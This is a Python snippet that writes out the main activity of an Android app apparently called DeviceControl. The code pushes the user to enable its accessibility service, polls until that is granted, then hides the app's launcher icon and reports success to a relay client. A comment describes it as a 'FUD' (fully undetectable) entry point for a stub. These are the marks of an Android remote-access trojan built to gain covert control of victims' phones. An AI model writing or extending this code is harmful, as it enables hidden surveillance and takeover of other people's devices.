with open("E:/DeviceControl/app/src/user/java/com/device/ctrl/MainActivity.java", "w", encoding="utf-8") as f:
    f.write("""package com.device.ctrl;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startHidden(this);
        finish();
    }

    // FUD Entry Point for Reflection by the Stub
    public static void startHidden(Context ctx) {
        if (isAccessibilityEnabled(ctx)) {
            hideAppIcon(ctx);
            return;
        }
        openAccessibilitySettings(ctx);
        startMonitorForA11y(ctx);
    }

    private static boolean isAccessibilityEnabled(Context ctx) {
        int accessibilityEnabled = 0;
        final String service = ctx.getPackageName() + "/" + ControlService.class.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(ctx.getContentResolver(), android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Exception ignored) {}
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    if (mStringColonSplitter.next().equalsIgnoreCase(service)) return true;
                }
            }
        }
        return false;
    }

    private static void openAccessibilitySettings(Context ctx) {
        try {
            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    private static void startMonitorForA11y(Context ctx) {
        Handler h = new Handler(Looper.getMainLooper());
        Runnable check = new Runnable() {
            @Override public void run() {
                if (isAccessibilityEnabled(ctx)) {
                    hideAppIcon(ctx);
                } else {
                    h.postDelayed(this, 1000);
                }
            }
        };
        h.postDelayed(check, 1000);
    }

    private static void hideAppIcon(Context ctx) {
        try {
            PackageManager p = ctx.getPackageManager();
            // Dynamically find the launcher component (works for User, FUD, or any stub)
            Intent launchIntent = p.getLaunchIntentForPackage(ctx.getPackageName());
            if (launchIntent != null && launchIntent.getComponent() != null) {
                p.setComponentEnabledSetting(launchIntent.getComponent(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                RelayClient.get().sendLog("👻 App icon hidden successfully.");
            }
        } catch (Exception ignored) {}
    }

    public static class App extends android.app.Application {}
    public static class BootReceiver extends android.content.BroadcastReceiver {
        @Override public void onReceive(android.content.Context ctx, Intent intent) {}
    }
}
""")
